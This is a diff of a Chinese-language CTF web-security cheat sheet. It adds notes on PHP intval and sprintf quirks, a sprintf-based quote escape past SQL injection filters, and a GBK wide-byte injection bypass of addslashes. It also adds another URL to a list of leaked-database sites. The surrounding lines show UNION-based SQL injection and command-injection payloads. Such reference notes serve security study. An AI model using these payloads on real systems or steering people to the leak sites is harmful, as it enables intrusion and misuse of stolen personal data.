@@ -188,10 +188,13 @@ A=fl;B=ag;cat $A$B
 - `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
     - `1`
 
-## intval四捨五入
+## intval
 
-- `var_dump(intval('5278.8787'));`
-    - `5278`
+- 四捨五入
+    - `var_dump(intval('5278.8787'));`
+        - `5278`
+- `intval(012)` => 10
+- `intval("012")` => 12
 
 ## extract變數覆蓋
 
@@ -232,6 +235,16 @@ A=fl;B=ag;cat $A$B
         }
         ```
     - 其他： false
+
+## sprintf / vprintf
+
+- 對格式化字串的類型沒檢查
+- 格式化字串中%後面的字元(除了%之外)會被當成字串類型吃掉
+    - 例如`%\`、`%'`、`%1$\'`
+    - 在某些SQLi過濾狀況下，`%' and 1=1#`中的單引號會被轉義成`\'`，`%\`又會被吃掉，`'`成功逃逸
+    - 原理：sprintf實作是用switch...case...
+        - 碰到未知類型，`default`不處理
+
 
 ## 其他
 
@@ -446,6 +459,14 @@ cat $(ls)
     - `id=-1/**/UNION/**/SELECT/**/1,2,3`
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
     - `id=(-1)UNION(SELECT(1),2,3)`
+
+- 寬字節注入
+    - `addslashes()`會讓`'`變`\'`
+    - 在`GBK`編碼中，中文字用兩個Bytes表示
+        - 其他多字節編碼也可
+        - 但要低位範圍有包含`0x5c`(`\`)
+    - 第一個Byte要>128才是中文
+    - `%df'` => `%df\'` => `運'` (成功逃逸)
 
 - group by with rollup
     - `' or 1=1 group by pwd with rollup limit 1 offset 2#`
@@ -1327,6 +1348,8 @@ xxe.dtd:
 - https://leakedsource.ru/
 
 - https://www.shuju666.com/
+
+- http://www.pwsay.com/
 
 - http://leakbase.pw
 
